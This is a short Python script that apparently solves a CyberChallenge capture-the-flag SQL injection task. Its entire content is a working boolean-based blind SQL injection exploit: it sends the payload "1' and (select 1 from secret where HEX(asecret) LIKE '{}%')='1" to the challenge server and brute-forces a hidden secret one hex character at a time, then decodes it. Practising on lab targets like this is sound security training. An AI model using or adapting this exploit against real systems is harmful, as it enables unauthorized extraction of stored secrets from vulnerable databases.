from inj_class import Inj


inj = Inj('http://sqlinjection.challs.cyberchallenge.it/')

#result, error = inj.union("1' and (select 1 from secret where hex(asecret) LIKE 'guess%')='1") # will make a request to the 'union' endpoint
#print(result, error)



payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"

dictionary = '0123456789abcdef'
result = ''
i = 0

while True:

    for c in dictionary:
        i= i+1
        print('prova ', i)
        question = payload.format(result + c)  
        response, error = inj.blind(question)
        if response == 'Success': # We have a match!
            result += c
            break
    else:
        break # yup, for loops in python have an else condition
print(bytes.fromhex(result))


